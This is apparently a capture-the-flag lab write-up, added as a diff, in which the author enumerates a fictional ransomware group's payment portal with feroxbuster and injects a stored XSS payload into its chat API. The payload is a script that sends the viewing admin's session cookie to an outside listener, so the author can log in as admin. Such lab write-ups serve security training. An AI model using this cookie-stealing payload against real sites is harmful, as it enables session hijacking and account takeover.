@@ -1,0 +1,129 @@
+#+title: Hexar
+#+author: gabriel
+#+description: easy lab
+
+* intro
+Last night, one of our client organizations was hit by a cyber attack, likely a ransomware incident. All files on the affected workstation are encrypted and inaccessible, rendering the system unusable. The attackers left a READ_ME_HEXAR.txt ransom note on the desktop containing a link for chat/payment and a unique device ID.
+
+Your mission is to gather information about the ransomware group and take the necessary steps to recover the data on the system.
+
+#+begin_src text
+YOUR FILES HAVE BEEN ENCRYPTED BY HEXAR RANSOMWARE!
+
+All important files on this machine are encrypted and unavailable.
+Do not modify, rename, or delete files — you will lose them permanently.
+
+To recover your files:
+1) Visit our portal: hexar1c2adk0mr1r[.]hv
+2) Enter your device ID: WIN-KH8L9J0K1L2M
+3) Follow the payment instructions.
+
+ATTENTION:
+- Do NOT turn off your PC.
+- Do NOT contact law enforcement.
+- Use the chat on our portal for payment and decryption key.
+
+Use chat on our portal for payment details and the decryption key.
+
+HEXAR
+#+end_src
+
+* enum with feroxbuster
+#+begin_src sh
+feroxbuster --url http://hexar1c2adk0mr1r.hv
+                                                                                
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://hexar1c2adk0mr1r.hv
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      284c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      324c http://hexar1c2adk0mr1r.hv/api => http://hexar1c2adk0mr1r.hv/api/
+301      GET        9l       28w      331c http://hexar1c2adk0mr1r.hv/javascript => http://hexar1c2adk0mr1r.hv/javascript/
+200      GET      101l      254w     3841c http://hexar1c2adk0mr1r.hv/assets/js/main.js
+200      GET     1006l     1881w    20942c http://hexar1c2adk0mr1r.hv/assets/css/style.css
+200      GET       33l       62w     1037c http://hexar1c2adk0mr1r.hv/
+301      GET        9l       28w      327c http://hexar1c2adk0mr1r.hv/assets => http://hexar1c2adk0mr1r.hv/assets/
+301      GET        9l       28w      331c http://hexar1c2adk0mr1r.hv/assets/css => http://hexar1c2adk0mr1r.hv/assets/css/
+301      GET        9l       28w      330c http://hexar1c2adk0mr1r.hv/assets/js => http://hexar1c2adk0mr1r.hv/assets/js/
+301      GET        9l       28w      338c http://hexar1c2adk0mr1r.hv/javascript/jquery => http://hexar1c2adk0mr1r.hv/javascript/jquery/
+200      GET    10870l    44283w   287600c http://hexar1c2adk0mr1r.hv/javascript/jquery/jquery
+[####################] - 31s   210028/210028  0s      found:10      errors:1      
+[####################] - 22s    30000/30000   1364/s  http://hexar1c2adk0mr1r.hv/ 
+[####################] - 26s    30000/30000   1158/s  http://hexar1c2adk0mr1r.hv/api/ 
+[####################] - 28s    30000/30000   1060/s  http://hexar1c2adk0mr1r.hv/javascript/ 
+[####################] - 27s    30000/30000   1122/s  http://hexar1c2adk0mr1r.hv/assets/ 
+[####################] - 26s    30000/30000   1173/s  http://hexar1c2adk0mr1r.hv/assets/js/ 
+[####################] - 26s    30000/30000   1171/s  http://hexar1c2adk0mr1r.hv/javascript/jquery/
+#+end_src
+
+* XSS at chat
+O chat se baseia em um API no backend, após mandar um get pra API ->
+#+begin_src sh
+GET /api/chat.php HTTP/1.1
+Host: hexar1c2adk0mr1r.hv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://hexar1c2adk0mr1r.hv/dashboard.php
+Connection: keep-alive
+Cookie: PHPSESSID=b35b3101592cb7adeeb306412da19e87
+Priority: u=4
+
+#+end_src
+
+*response* ->
+#+begin_src sh
+HTTP/1.1 200 OK
+Date: Thu, 02 Oct 2025 17:53:30 GMT
+Server: Apache/2.4.62 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4649
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/json
+
+{"messages":[{"id":21,"0":21,"victim_id":6,"1":6,"sender_type":"hacker","2":"hacker","message":"Your engineering workstation has been encrypted with advanced ransomware. Pay $2800 to decrypt all your files.","3":"Your engineering workstation has been encrypted with advanced ransomware. Pay $2800 to decrypt all your files.","created_at":"2025-07-31 14:00:08","4":"2025-07-31 14:00:08"},
+#+end_src
+
+*Craft the post request with payload* ->
+#+begin_src sh
+POST /api/chat.php HTTP/1.1
+Host: hexar1c2adk0mr1r.hv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://hexar1c2adk0mr1r.hv/dashboard.php
+Content-Type: application/json
+Content-Length: 143
+Origin: http://hexar1c2adk0mr1r.hv
+Connection: keep-alive
+Cookie: PHPSESSID=b35b3101592cb7adeeb306412da19e87
+Priority: u=0
+
+{
+"sender_type":"hacker","2":"hacker",
+"id":20,
+"message":"<script>fetch(\"http://172.20.69.80:7777/?cookie=\"+document.cookie)</script>"
+}
+#+end_src
+
+O payload será executado no lado do ADmin, e com o cookie obtido será possível logar na aplicação como admin do sistema.
